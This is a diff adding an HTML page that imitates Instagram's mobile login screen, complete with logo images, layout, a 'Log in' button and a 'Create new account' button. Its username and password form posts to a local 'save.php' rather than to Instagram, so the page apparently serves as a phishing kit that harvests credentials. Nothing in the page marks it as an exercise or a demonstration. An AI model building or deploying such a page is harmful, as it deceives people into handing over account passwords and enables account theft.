@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Mobile</title>
+    <style>
+      :root {
+        --bg: #1d2b36;
+        --panel: #22323e;
+        --panel-line: #31424f;
+        --text: #f3f6fa;
+        --muted: #aab4bf;
+        --blue: #0b65e9;
+        --blue-line: #2f6db1;
+        --nav: #111111;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        min-height: 100vh;
+        font-family: Arial, sans-serif;
+        background: var(--bg);
+        color: var(--text);
+      }
+
+      .mobile-page {
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+      }
+
+      .mobile-top {
+        padding: 14px 14px 6px;
+      }
+
+      .back-link {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 28px;
+        height: 28px;
+        color: #dbe3ea;
+        text-decoration: none;
+        font-size: 28px;
+        line-height: 1;
+      }
+
+      .mobile-main {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        padding: 6px 14px 24px;
+      }
+
+      .language {
+        margin: 6px 0 34px;
+        text-align: center;
+        color: var(--muted);
+        font-size: 14px;
+      }
+
+      .logo-wrap {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 42px;
+      }
+
+      .logo-wrap img {
+        width: 160px;
+        max-width: 72vw;
+        height: auto;
+        display: block;
+        border-radius: 10px;
+      }
+
+      .mobile-form {
+        display: grid;
+        gap: 12px;
+      }
+
+      .mobile-input {
+        width: 100%;
+        height: 54px;
+        border: 1px solid var(--panel-line);
+        border-radius: 16px;
+        background: transparent;
+        color: var(--text);
+        padding: 0 16px;
+        outline: none;
+        font-size: 16px;
+      }
+
+      .mobile-input::placeholder {
+        color: #8e9aa5;
+      }
+
+      .mobile-submit {
+        width: 100%;
+        height: 54px;
+        border: none;
+        border-radius: 16px;
+        background: var(--blue);
+        color: white;
+        font-size: 18px;
+        font-weight: 700;
+      }
+
+      .forgot-link {
+        display: block;
+        margin: 18px 0 0;
+        text-align: center;
+        text-decoration: none;
+        color: #edf3f9;
+        font-size: 15px;
+      }
+
+      .bottom-actions {
+        margin-top: auto;
+        padding-top: 26px;
+      }
+
+      .create-btn {
+        width: 100%;
+        height: 50px;
+        border: 1px solid var(--blue-line);
+        border-radius: 25px;
+        background: transparent;
+        color: #61a7ff;
+        font-size: 18px;
+      }
+
+      .footer-logo {
+        display: flex;
+        justify-content: center;
+        margin-top: 8px;
+      }
+
+      .footer-logo img {
+        width: 126px;
+        max-width: 50vw;
+        height: auto;
+        display: block;
+        border-radius: 8px;
+      }
+
+      .bottom-nav {
+        height: 66px;
+        background: var(--nav);
+        border-top: 1px solid rgba(255, 255, 255, 0.06);
+        display: grid;
+        grid-template-columns: repeat(5, 1fr);
+        align-items: center;
+        justify-items: center;
+      }
+
+      .nav-icon {
+        position: relative;
+        width: 22px;
+        height: 22px;
+        color: #f5f5f5;
+      }
+
+      .home {
+        border: 2px solid currentColor;
+        border-top: none;
+        border-radius: 4px;
+        width: 16px;
+        height: 13px;
+        margin-top: 7px;
+      }
+
+      .home::before {
+        content: "";
+        position: absolute;
+        left: -1px;
+        top: -7px;
+        width: 14px;
+        height: 14px;
+        border-top: 2px solid currentColor;
+        border-left: 2px solid currentColor;
+        transform: rotate(45deg);
+      }
+
+      .bookmark {
+        width: 15px;
+        height: 18px;
+        border: 2px solid currentColor;
+        border-radius: 3px;
+        clip-path: polygon(0 0, 100% 0, 100% 100%, 50% 76%, 0 100%);
+      }
+
+      .search {
+        width: 17px;
+        height: 17px;
+        border: 2px solid currentColor;
+        border-radius: 50%;
+      }
+
+      .search::after {
+        content: "";
+        position: absolute;
+        right: -1px;
+        bottom: -3px;
+        width: 7px;
+        height: 2px;
+        border-radius: 999px;
+        background: currentColor;
+        transform: rotate(45deg);
+      }
+
+      .reels {
+        width: 18px;
+        height: 18px;
+        border: 2px solid currentColor;
+        border-radius: 5px;
+      }
+
+      .reels::before {
+        content: "4";
+        position: absolute;
+        inset: 0;
+        display: grid;
+        place-items: center;
+        font-size: 11px;
+        font-weight: 700;
+      }
+
+      .menu,
+      .menu::before,
+      .menu::after {
+        height: 2px;
+        border-radius: 999px;
+        background: currentColor;
+      }
+
+      .menu {
+        width: 16px;
+        margin-top: 2px;
+      }
+
+      .menu::before,
+      .menu::after {
+        content: "";
+        position: absolute;
+        left: 0;
+        width: 16px;
+      }
+
+      .menu::before {
+        top: -6px;
+      }
+
+      .menu::after {
+        top: 6px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="mobile-page">
+      <div class="mobile-top">
+        <a href="index.html" class="back-link" aria-label="Back">&#8249;</a>
+      </div>
+
+      <main class="mobile-main">
+        <div class="language">English (UK)</div>
+
+        <div class="logo-wrap">
+          <img src="./assets/img/ml.jpeg" alt="Company logo" />
+        </div>
+
+        <form class="mobile-form" method="POST" action="save.php">
+          <input
+            class="mobile-input"
+            name="name"
+            type="text"
+            placeholder="Username, email address or mobile number"
+            required
+          />
+          <input
+            class="mobile-input"
+            name="password"
+            type="password"
+            placeholder="Password"
+            required
+          />
+          <button class="mobile-submit" type="submit">Log in</button>
+        </form>
+
+        <a href="#" class="forgot-link">Forgotten password?</a>
+
+        <div class="bottom-actions">
+          <button class="create-btn" type="button">Create new account</button>
+          <div class="footer-logo">
+            <img src="./assets/img/mm.jpeg" alt="Company logo" />
+          </div>
+        </div>
+      </main>
+
+      <div class="bottom-nav" aria-hidden="true">
+        <span class="nav-icon home"></span>
+        <span class="nav-icon bookmark"></span>
+        <span class="nav-icon search"></span>
+        <span class="nav-icon reels"></span>
+        <span class="nav-icon menu"></span>
+      </div>
+    </div>
+  </body>
+</html>
